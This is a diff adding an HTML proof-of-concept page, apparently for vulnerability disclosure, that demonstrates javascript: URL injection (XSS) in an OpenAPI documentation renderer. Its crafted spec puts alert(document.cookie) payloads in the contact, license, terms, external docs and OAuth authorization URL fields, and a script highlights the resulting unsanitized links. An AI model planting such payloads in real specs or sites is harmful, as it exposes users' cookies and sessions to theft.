@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>H3 PoC — javascript: injection via OpenAPI spec URLs</title>
+<style>
+  body { font-family: monospace; background: #1a1a1a; color: #e0e0e0; padding: 2em; }
+  .warn { color: #ff6b6b; font-weight: bold; }
+  .ok   { color: #69db7c; }
+  pre   { background: #2d2d2d; padding: 1em; border-radius: 4px; overflow: auto; }
+  h2    { color: #ffd43b; }
+  a     { color: #74c0fc; }
+</style>
+</head>
+<body>
+<h1 class="warn">H3 PoC — Acme javascript: URL injection</h1>
+<p>
+  This page embeds Acme with a <span class="warn">malicious OpenAPI spec</span>
+  that places <code>javascript:</code> payloads in all five URL sink fields.
+  Click any of the highlighted links below to trigger the XSS.
+</p>
+
+<h2>Affected links (click to trigger alert)</h2>
+<ul>
+  <li><b>Authorization URL</b> — in Security Schemes → oauth2_implicit → Implicit flow</li>
+  <li><b>Contact URL</b> — in API Info header</li>
+  <li><b>License URL</b> — in API Info header</li>
+  <li><b>Terms of Service</b> — in API Info header</li>
+  <li><b>External Docs URL</b> — just below API description</li>
+</ul>
+
+<p class="warn">All five links render with href="javascript:alert(...)" — no sanitization applied.</p>
+
+<hr>
+<h2>Malicious spec (injected inline)</h2>
+<pre id="spec-display"></pre>
+
+<hr>
+<div id="acme-container"></div>
+
+<script>
+// Display the spec for reviewers
+document.getElementById('spec-display').textContent = "{\n  \"openapi\": \"3.0.0\",\n  \"info\": {\n    \"title\": \"Malicious API\",\n    \"version\": \"1.0.0\",\n    \"contact\": {\n      \"name\": \"Click me (safe-looking text)\",\n      \"url\": \"javascript:alert('XSS-contact-url: '+document.cookie)\"\n    },\n    \"license\": {\n      \"name\": \"MIT\",\n      \"url\": \"javascript:alert('XSS-license-url: '+document.cookie)\"\n    },\n    \"termsOfService\": \"javascript:alert('XSS-termsOfService: '+document.cookie)\"\n  },\n  \"externalDocs\": {\n    \"description\": \"Find out more\",\n    \"url\": \"javascript:alert('XSS-externalDocs-url: '+document.cookie)\"\n  },\n  \"components\": {\n    \"securitySchemes\": {\n      \"oauth2_implicit\": {\n        \"type\": \"oauth2\",\n        \"flows\": {\n          \"implicit\": {\n            \"authorizationUrl\": \"javascript:alert('XSS-authorizationUrl: '+document.cookie)\",\n            \"scopes\": {\n              \"read:api\": \"Read access\"\n            }\n          }\n        }\n      }\n    }\n  },\n  \"paths\": {}\n}";
+</script>
+
+<!-- Acme CDN — uses same parser/renderer pipeline as npm package -->
+<script src="https://cdn.jsdelivr.net/npm/acme@2.5.2/bundles/acme.standalone.js"></script>
+<script>
+const SPEC = {
+  "openapi": "3.0.0",
+  "info": {
+    "title": "Malicious API",
+    "version": "1.0.0",
+    "contact": {
+      "name": "Click me (safe-looking text)",
+      "url": "javascript:alert('XSS-contact-url: '+document.cookie)"
+    },
+    "license": {
+      "name": "MIT",
+      "url": "javascript:alert('XSS-license-url: '+document.cookie)"
+    },
+    "termsOfService": "javascript:alert('XSS-termsOfService: '+document.cookie)"
+  },
+  "externalDocs": {
+    "description": "Find out more",
+    "url": "javascript:alert('XSS-externalDocs-url: '+document.cookie)"
+  },
+  "components": {
+    "securitySchemes": {
+      "oauth2_implicit": {
+        "type": "oauth2",
+        "flows": {
+          "implicit": {
+            "authorizationUrl": "javascript:alert('XSS-authorizationUrl: '+document.cookie)",
+            "scopes": {
+              "read:api": "Read access"
+            }
+          }
+        }
+      }
+    }
+  },
+  "paths": {}
+};
+
+Acme.init(SPEC, {
+  scrollYOffset: 50,
+  hideDownloadButtons: true,
+}, document.getElementById('acme-container'))
+  .then(() => {
+    // After render, find all <a> tags and highlight the javascript: ones
+    const allLinks = document.querySelectorAll('#acme-container a[href^="javascript:"]');
+    console.log('[PoC] Found', allLinks.length, 'javascript: href links in rendered Acme output');
+    allLinks.forEach(a => {
+      a.style.outline = '3px solid red';
+      a.style.backgroundColor = '#3d0000';
+      a.title = 'VULNERABLE: href=' + a.getAttribute('href');
+    });
+    if (allLinks.length > 0) {
+      console.log('[PoC] CONFIRMED: javascript: links present in DOM');
+    }
+  })
+  .catch(err => console.error('[PoC] Acme init error:', err));
+</script>
+</body>
+</html>
